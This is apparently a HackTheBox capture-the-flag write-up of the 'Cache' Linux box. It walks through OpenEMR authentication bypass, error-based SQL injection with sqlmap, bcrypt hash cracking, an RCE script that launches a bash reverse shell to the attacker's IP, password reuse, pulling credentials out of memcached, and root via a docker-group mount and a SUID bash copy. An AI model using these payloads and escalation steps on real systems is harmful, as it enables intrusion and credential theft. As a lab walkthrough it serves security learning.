---
title: HTB: Cache
url: https://0xdf.gitlab.io/2020/10/10/htb-cache.html
date: 2020-10-10T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-cache, hackthebox, nmap, ubuntu, gobuster, vhosts, javascript, credentials, password-reuse, wfuzz, openemr, searchsploit, auth-bypass, sqli, injection, sqlmap, hashcat, memcached, docker, htb-dab, htb-olympus
---

![Cache](https://0xdfimages.gitlab.io/img/cache-cover.png)

Cache rates medium based on number of steps, none of which are particularly challenging. There’s a fair amount of enumeration of a website, first, to find a silly login page that has hardcoded credentials that I’ll store for later, and then to find a new VHost that hosts a vulnerable OpenEMR system. I’ll exploit that system three ways, first to bypass authentication, which provides access to a page vulnerable to SQL-injection, which I’ll use to dump the hashes. After cracking the hash, I’ll exploit the third vulnerability with a script from ExploitDB which provides authenticated code execution. That RCE provides a shell. I’ll escalate to the next user reusing the creds from the hardcoded website. I’ll find creds for the next user in memcached. This user is in the docker group, which I’ll exploit to get root access.

## Box Info

| Name | [Cache](https://hackthebox.com/machines/cache)  [Cache](https://hackthebox.com/machines/cache) [Play on HackTheBox](https://hackthebox.com/machines/cache) |
| --- | --- |
| Release Date | [09 May 2020](https://twitter.com/hackthebox_eu/status/1258407649374330881) |
| Retire Date | 10 Oct 2020 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Cache |
| Radar Graph | Radar chart for Cache |
| First Blood User | 01:17:40[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| First Blood Root | 01:28:14[InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |
| Creator | [ASHacker ASHacker](https://app.hackthebox.com/users/23227) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (9001):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 14:20 EDT
Nmap scan report for 10.10.10.188
Host is up (0.015s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2201/tcp open  ats

Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
root@kali# nmap -sV -sC -p 22,80,2201 -oA scans/tcpscripts 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-10 14:21 EDT
Nmap scan report for 10.10.10.188
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
2201/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.44 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Bionic 18.04. Given that SSH is running on two different ports, it seems likely that I may run into containers here.

### cache.htb - TCP 80

#### Site

The site looks like it was designed in the 90s, and is about how to hack:

[![](https://0xdfimages.gitlab.io/img/image-20200510142420731.png)](https://0xdfimages.gitlab.io/img/image-20200510142420731.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200510142420731.png)

Given the page title, I’ll add `cache.htb` to `/etc/hosts`, but it doesn’t change anything.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x html` since the links seem to all have `.html` endings:

```

root@kali# gobuster dir -u http://10.10.10.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html -t 40 -o scans/gobuster-root-small-html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.188
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html
[+] Timeout:        10s
===============================================================
2020/05/10 14:39:50 Starting gobuster
===============================================================
/contactus.html (Status: 200)
/author.html (Status: 200)
/net.html (Status: 200)
/javascript (Status: 301)
/index.html (Status: 200)
/login.html (Status: 200)
/news.html (Status: 200)
/jquery (Status: 301)
===============================================================
2020/05/10 14:41:01 Finished
===============================================================

```

`index.html` is above. `news.html` doesn’t seem to have anything interesting.

#### /login.html

`/login.html` presents a login form:

![image-20200510144026206](https://0xdfimages.gitlab.io/img/image-20200510144026206.png)

I put in oxdf / oxdf, and it pops two error messages:

![image-20200510143421387](https://0xdfimages.gitlab.io/img/image-20200510143421387.png)

![image-20200510143432141](https://0xdfimages.gitlab.io/img/image-20200510143432141.png)

My thinking at the time was that I could likely bruteforce users since there’s a separate error message for that, but when I went into Burp to see what the POST request looked like, there was no request. After making sure I had it set up correctly, I checked the HTML source to look for Javascript. There’s three script imports at the bottom:

```

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="jquery/functionality.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>

```

`functionality.js` is the interesting one:

```

$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();

        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});

```

It has JavaScript with hardcoded username and password, ash / H@v3\_fun.

Logging in just redirects to `net.html`:

![image-20200510143806105](https://0xdfimages.gitlab.io/img/image-20200510143806105.png)

The page source shows that I could see this without logging in, either by not allowing my browser to following redirects, or by including a referrer header:

```

<html>
<head>
 <body onload="if (document.referrer == '') self.location='login.html';">   
	<style>
body  {
  background-color: #cccccc;
}
</style>
</head>
<center>
	<h1> Welcome Back!</h1>
	<img src="4202252.jpg">

<h1>This page is still underconstruction</h1>
</center>
 </body>
</html>

```

I’ll keep these creds around for later.

#### /contactus.html

`contactus.html` has a form to send a message to the site:

![image-20200511063521022](https://0xdfimages.gitlab.io/img/image-20200511063521022.png)

Interestingly, this form submits as a GET request, and the target is the HTML page:

```

GET /contactus.html?firstname=asdf&lastname=asdf&country=australia&subject=asdfasdf HTTP/1.1

```

This seems very unlikely to be functional. I did some basic playing around looking for SQLi, but nothing jumped out. I did notice that if you don’t change the country from India, it sends australia, and if you actually select India, it won’t submit.

#### /author.html

`author.html` contains information about the ash:

![image-20200510171425665](https://0xdfimages.gitlab.io/img/image-20200510171425665.png)

I already found some creds for ash earlier. He has another project “like Cache”, HMS.

### Virtual Host Enumeration

#### Brute Force

Given the references on the page to `cache.htb`, it makes sense to look for other vhosts with `wfuzz`:

```

root@kali# wfuzz -c -u http://10.10.10.188 -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.cache.htb" --hh 8193 --hc 400
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.188/
Total requests: 2178751

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                          
===================================================================

Total time: 4209.418
Processed Requests: 2178751
Filtered Requests: 2178751
Requests/sec.: 517.5895

```

It doesn’t find anything interesting.

#### Other Guessing

Based on the wording on `author.html`, where it says there’s a project like Cache, I kicked a simple GET request over to Repeater, and started messing with the `Host:` HTTP header. I note that `Host: cache.htb` returns 8471 bytes:

![image-20200510171811685](https://0xdfimages.gitlab.io/img/image-20200510171811685.png)

Based on the clues from the author page, I tried things like `hms.cache.htb` without much luck, but then I tried `hms.htb`:

![image-20200510171852231](https://0xdfimages.gitlab.io/img/image-20200510171852231.png)

### hms.htb

#### Site

This presents a login page for an instance of OpenEMR:

![image-20200510172037243](https://0xdfimages.gitlab.io/img/image-20200510172037243.png)

I immediately tried the creds I had for ash, but it didn’t work.

#### Vulnerabilities

`searchsploit` gives a bunch of things:

```

root@kali# searchsploit openemr
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
OpenEMR - 'site' Cross-Site Scripting                                                 | php/webapps/38328.txt
OpenEMR - Arbitrary '.PHP' File Upload (Metasploit)                                   | php/remote/24529.rb
OpenEMR 2.8.1 - 'fileroot' Remote File Inclusion                                      | php/webapps/1886.txt
OpenEMR 2.8.1 - 'srcdir' Multiple Remote File Inclusions                              | php/webapps/2727.txt
OpenEMR 2.8.2 - 'Import_XML.php' Remote File Inclusion                                | php/webapps/29556.txt
OpenEMR 2.8.2 - 'Login_Frame.php' Cross-Site Scripting                                | php/webapps/29557.txt
OpenEMR 3.2.0 - SQL Injection / Cross-Site Scripting                                  | php/webapps/15836.txt
OpenEMR 4 - Multiple Vulnerabilities                                                  | php/webapps/18274.txt
OpenEMR 4.0 - Multiple Cross-Site Scripting Vulnerabilities                           | php/webapps/36034.txt
OpenEMR 4.0.0 - Multiple Vulnerabilities                                              | php/webapps/17118.txt
OpenEMR 4.1 - '/contrib/acog/print_form.php?formname' Traversal Local File Inclusion  | php/webapps/36650.txt
OpenEMR 4.1 - '/Interface/fax/fax_dispatch.php?File' 'exec()' Call Arbitrary Shell Co | php/webapps/36651.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/load_form.php?formname' Traversal Lo | php/webapps/36649.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/trend_form.php?formname' Traversal L | php/webapps/36648.txt
OpenEMR 4.1 - 'note' HTML Injection                                                   | php/webapps/38654.txt
OpenEMR 4.1.1 - 'ofc_upload_image.php' Arbitrary File Upload                          | php/webapps/24492.php
OpenEMR 4.1.1 Patch 14 - Multiple Vulnerabilities                                     | php/webapps/28329.txt
OpenEMR 4.1.1 Patch 14 - SQL Injection / Privilege Escalation / Remote Code Execution | php/remote/28408.rb
OpenEMR 4.1.2(7) - Multiple SQL Injections                                            | php/webapps/35518.txt
OpenEMR 5.0.0 - OS Command Injection / Cross-Site Scripting                           | php/webapps/43232.txt
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                              | linux/webapps/45202.txt
OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution                               | php/webapps/45161.py
OpenEMR Electronic Medical Record Software 3.2 - Multiple Vulnerabilities             | php/webapps/14011.txt
Openemr-4.1.0 - SQL Injection                                                         | php/webapps/17998.txt
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

What I found most helpful was this report from the [OpenEMR wiki](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) going through all sorts of different attacks against OpenEMR.

## Shell as www-data

### OpenEMR Unauthenticated Data Leaks

In section 4 of the [vulnerability report](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) there are three examples of unauthenticated information disclosure vulnerabilities.

On visiting `http://hms.htb/admin.php`, it returns the Site ID, database name, Site Name, and version of the software:

![image-20200511064242014](https://0xdfimages.gitlab.io/img/image-20200511064242014.png)

I can also get the version information from `http://hms.htb/sql_patch.php`:

![image-20200511064344138](https://0xdfimages.gitlab.io/img/image-20200511064344138.png)

Now that I have the version, I’m particularly interesting in that RCE exploit against “< 5.0.1”. `searchsploit` is really bad at versioning, so it’s not immediately clear to me if that’s patched in 5.0.1, or that it works in there. I’ll definitely try if I can find creds.

More information about the database will leak from `http://hms.htb/gacl/setup.php`:

![image-20200511064426709](https://0xdfimages.gitlab.io/img/image-20200511064426709.png)

### OpenEMR Authentication Bypass

Section 2 of the [report](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) details an authentication bypass in the patient portal. For example, if I navigate to `http://hms.htb/portal/add_edit_event_user.php`, it returns a series of redirects that conclude at the portal login page with an error message:

![image-20200511070324903](https://0xdfimages.gitlab.io/img/image-20200511070324903.png)

To bypass this, I can first visit `http://hms.htb/portal/account/register.php`. Then just entering that same previous url into Firefox returns the page as if I’m logged in:

![image-20200511070451316](https://0xdfimages.gitlab.io/img/image-20200511070451316.png)

Visiting the `register.php` seems to set the session as logged in for some period of time (maybe 10 minutes?).

### Get Creds for OpenEMR

With the authentication bypass I gain access to many of the pages that the report shows with SQL injection vulnerabilities. For example, the POC for `add_edit_event_user.php` is:

```

http://host/openemr/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))

```

Visiting `http://hms.htb/portal/add_edit_event_user.php?eid=1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))` returns:

![image-20200511131330231](https://0xdfimages.gitlab.io/img/image-20200511131330231.png)

It’s an error, but I can see the result, `5.7.30-0ubuntu0.18.04.1` in the error message. This is Error-based SQLi.

This is a tricky one to do manually, but `sqlmap` will nail it. I’ll go into Burp, find that request, and “copy to file”. I’ll edit the url to remove the injection part, leaving this:

```

GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=7es8n2o6ab2s8nu5njec0esaus; OpenEMR=glu0rgv7348lt5tgk788cv0tf5
Upgrade-Insecure-Requests: 1

```

It is important that that `PHPSESSID` cookie is the one that was validated with the auth bypass. Then I can run `sqlmap` to enumerate the database. First find the injection:

```

root@kali# sqlmap -r add_edit_event_user.request
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
...[snip]...
GET parameter 'eid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---                                                       
Parameter: eid (GET)                                      
    Type: boolean-based blind                             
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (8430=8430) THEN 1 ELSE (SELECT 1611 UNION SELECT 5937) END))

    Type: error-based                                     
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(4940,CONCAT(0x5c,0x7178767871,(SELECT (ELT(4940=4940,1))),0x716a787671))

    Type: time-based blind                                
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 9065 FROM (SELECT(SLEEP(5)))uzSl)

    Type: UNION query                                     
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7178767871,0x5175594d4b427175765279616a4544664a7176636a65436e5655646d6174516b676e556d6b624568,0x716a787671),NULL-- -
---                                                       
[11:38:31] [INFO] the back-end DBMS is MySQL                                                                         
back-end DBMS: MySQL >= 5.1                               
[11:38:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/hms.htb'

```

There are four different injection attacks.

Now list the dbs:

```

root@kali# sqlmap -r add_edit_event_user.request --dbs
...[snip]...
available databases [2]:
[*] information_schema                                    
[*] openemr    

```

Tables in `openemr`:

```

root@kali# sqlmap -r add_edit_event_user.request -D openemr --tables
...[snip]...
Database: openemr
[234 tables]                                              
+---------------------------------------+
| array                                 |
| groups                                |
| sequences                             |
| version                               |
...[snip]...
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| voids                                 |
| x12_partners                          |
+---------------------------------------+
...[snip]...

```

I dumped the `users` table, but didn’t find much. In `users_secure`, I found the admin login:

```

root@kali# sqlmap -r add_edit_event_user.request -D openemr -T users_secure --dump
...[snip]...
Database: openemr
Table: users_secure
[1 entry]
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
...[snip]...

```

### Crack Hashes

I’ll save the hash to a file:

```

root@kali# cat openemr_admin.hash 
openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B

```

The hash matches `bcrypt $2*$, Blowfish (Unix)` from the [Hashcat example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes), which is type 3200. This is a slow hash to crack, but it cracks very quickly:

```

root@kali# hashcat -m 3200 openemr_admin.hash /usr/share/wordlists/rockyou.txt --user --force                                                                                                              
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz, 1024/2955 MB allocatable, 3MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=6 -D KERN_TYPE=3200 -D _unroll'
* Device #1: Kernel m03200-pure.1d8f1f51.kernel not found in cache! Building may take a while...
* Device #1: Kernel amp_a0.1dcc03ba.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
Time.Started.....: Mon May 11 12:17:39 2020 (2 secs)
Time.Estimated...: Mon May 11 12:17:41 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      736 H/s (7.28ms) @ Accel:8 Loops:2 Thr:8 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 960/14344385 (0.01%)
Rejected.........: 0/960 (0.00%)
Restore.Point....: 768/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:30-32
Candidates.#1....: football1 -> sandy

Started: Mon May 11 12:17:22 2020
Stopped: Mon May 11 12:17:42 2020

```

### Authenticated Code Execution

#### POC

Now I can run the exploit script from searchsploit. I’ll try to have Cache ping me to test:

```

root@kali# python ./openemr-rce.py -u openemr_admin -p xxxxxx -c 'ping -c 1 10.10.14.47' http://hms.htb
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload
[$] Payload executed

```

In a separate window with `tcpdump` running, it works:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
12:35:26.704809 IP 10.10.10.188 > 10.10.14.47: ICMP echo request, id 7655, seq 1, length 64
12:35:26.704882 IP 10.10.14.47 > 10.10.10.188: ICMP echo reply, id 7655, seq 1, length 64 

```

#### Shell

Now I’ll get a shell by replacing the `ping` with a reverse shell:

```

root@kali# python ./openemr-rce.py -u openemr_admin -p xxxxxx -c 'bash -c "bash -i >& /dev/tcp/10.10.14.47/443 0>&1"' http://hms.htb                                                                
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload

```

It just hangs like this, but in a new window, I’ve got a shell:

```

root@kali# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.188.
Ncat: Connection from 10.10.10.188:57446.
bash: cannot set terminal process group (2167): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$

```

## Priv: www-data –> ash

With the creds I found earlier for the webpage (H@v3\_fun), I can `su` to ash:

```

www-data@cache:/var/www/hms.htb/public_html/interface/main$ su - ash
Password: 
ash@cache:~$

```

And get `user.txt`:

```

ash@cache:~$ cat user.txt
dba76925************************

```

## Priv: ash –> luffy

### Enumeration

In looking around, I noticed something listening on port 11211:

```

ash@cache:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)                                            
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -    

```

11211 is the default port for [memchaced](https://memcached.org/), and checking the process list confirms this:

```

ash@cache:~$ ps auxww | grep 11211
memcache   936  0.0  0.1 425792  4088 ?        Ssl  May11   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
ash       3308  0.0  0.0  13136  1108 pts/2    R+   00:27   0:00 grep --color=auto 11211

```

### memcached

Hacking Articles has a [decent post about Pentesting Memcached](https://www.hackingarticles.in/penetration-testing-on-memcached-server/). I’ll walk the same steps they show, which are the same steps I used in [Dab](/2019/02/02/htb-dab.html#memcached---tcp-11211). I can connect with `telnet`, and start by getting the version:

```

ash@cache:~$ telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
version
VERSION 1.5.6 Ubuntu

```

`stats slabs` gives information about the various slabs. In this case, there’s only one in use, 1:

```

stats slabs
STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 5
STAT 1:free_chunks 10917
STAT 1:free_chunks_end 0
STAT 1:mem_requested 371
STAT 1:get_hits 5
STAT 1:cmd_set 285
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048576
END

```

I can see what’s in the cache with `stats cachedump x y`, where `x` is the slab number I want and`y` is the number of keys I want to dump, where 0 is all.

```

stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END

```

Obviously `user` and `passwd` seem the most interesting, but I’ll dump each with `get`:

```

get link
VALUE link 0 21
https://hackthebox.eu
END
get user
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_p1ec3
END
get file
VALUE file 0 7
nothing
END
get account
VALUE account 0 9
afhj556uo
END

```

I can quit with Ctrl+], and then enter `quit` at the prompt.

### su

`su - luffy` works with this password (0ne\_p1ec3):

```

ash@cache:~$ su - luffy
Password: 
luffy@cache:~$

```

## Priv: luffy –> root

### Enumeration

As luffy, I’ll notice I’m in the `docker` group:

```

luffy@cache:~$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)

```

There are not containers currently running:

```

luffy@cache:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES

```

There is an Ubuntu image on Cache:

```

luffy@cache:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB

```

### root Filesystem Access

Just like in [Olympus](/2018/09/22/htb-olympus.html#privesc-to-root-file-system-access), being in the `docker` group is easy access to the filesystem root. I’ll just start a container, and mount the root file system into it. The following command will start that image as a container, with the root filesystem of Cache mounted on `/mnt` inside the container, and drop me at a Bash shell:

```

luffy@cache:~$ docker run -v /:/mnt -i -t ubuntu bash
root@67fd1a66bece:/#

```

Now I can access `root.txt`:

```

root@67fd1a66bece:/mnt/root# cat root.txt
e9f560a0************************

```

### root Shell

There’s a ton of ways to go from file system access to shell. For example, make a suid copy of `bash`:

```

root@db2fa4542744:/mnt# cp bin/bash home/luffy/.local/.0xdf
root@db2fa4542744:/mnt# ls -l home/luffy/.local/.0xdf
-rwxr-xr-x 1 root root 1113504 May 12 00:46 home/luffy/.local/.0xdf
root@db2fa4542744:/mnt# chmod 4755 home/luffy/.local/.0xdf
root@db2fa4542744:/mnt# ls -l home/luffy/.local/.0xdf
-rwsr-xr-x 1 root root 1113504 May 12 00:46 home/luffy/.local/.0xdf

```

Now exit the container, and run it (with `-p`):

```

luffy@cache:~$ .local/.0xdf -p
.0xdf-4.4# id
uid=1001(luffy) gid=1001(luffy) euid=0(root) groups=1001(luffy),999(docker)

```